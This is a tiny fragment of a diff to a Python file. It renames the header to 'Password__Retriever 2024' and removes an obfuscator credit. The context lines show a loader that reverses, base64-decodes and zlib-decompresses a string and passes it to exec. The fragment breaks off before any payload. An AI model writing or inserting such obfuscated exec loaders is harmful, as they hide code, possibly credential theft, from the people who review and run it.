@@ -1,4 +1,4 @@
-# Python obfuscation by freecodingtools.org
+# Password__Retriever 2024
 
 _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
 exec((_)(
